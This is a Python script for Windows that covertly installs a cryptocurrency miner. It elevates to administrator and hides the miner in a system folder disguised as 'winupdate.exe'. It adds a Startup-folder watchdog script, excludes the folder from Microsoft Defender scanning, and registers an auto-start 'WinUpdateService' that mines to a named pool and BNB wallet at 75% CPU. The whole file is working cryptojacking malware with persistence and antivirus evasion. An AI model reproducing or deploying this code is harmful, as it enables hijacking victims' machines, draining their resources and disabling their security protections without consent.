import os
import sys
import ctypes
import subprocess
import shutil

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        print("[*] Requesting admin privileges...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit()

def create_hidden_folder():
    folder = r"C:\ProgramData\Microsoft\Services\Update"
    os.makedirs(folder, exist_ok=True)
    subprocess.run(['attrib', '+h', '+s', folder], shell=True)
    return folder

def copy_exe_and_watchdog(target_folder):
    src_exe = os.path.join(os.path.dirname(__file__), "dummy.exe")
    dst_exe = os.path.join(target_folder, "winupdate.exe")
    shutil.copy(src_exe, dst_exe)
    subprocess.run(['attrib', '+h', '+s', dst_exe], shell=True)

    src_vbs = os.path.join(os.path.dirname(__file__), "watchdog.vbs")
    dst_vbs = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup\watchdog.vbs")
    shutil.copy(src_vbs, dst_vbs)

    return dst_exe

def add_defender_exclusion(path):
    try:
        subprocess.run([
            "powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}'"
        ], shell=True, check=True)
        print(f"[+] Defender exclusion added: {path}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Could not add Defender exclusion: {e}")

def create_service(service_name, custom_cmd):
    try:
        subprocess.run(['sc', 'delete', service_name], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cmd = f'sc create {service_name} binPath= "{custom_cmd}" start= auto'
        subprocess.run(cmd, shell=True, check=True)
        subprocess.run(['sc', 'start', service_name], shell=True)
        print(f"[+] Service '{service_name}' created and started.")
    except Exception as e:
        print(f"[!] Failed to create service: {e}")

def main():
    input("Press Enter to continue...")

    request_admin()
    folder = create_hidden_folder()
    exe_path = copy_exe_and_watchdog(folder)
    add_defender_exclusion(folder)

    custom_cmd = r'cmd.exe /c start /min "" "C:\ProgramData\Microsoft\Services\Update\winupdate.exe" --url rx.unmineable.com:3333 --user BNB:0x7CFd98f04BFFdf869576032147ce1a61d032BAf4.LAPTOP_MINER -p x --cpu-max-threads-hint 75'
    create_service("WinUpdateService", custom_cmd)

if __name__ == "__main__":
    main()

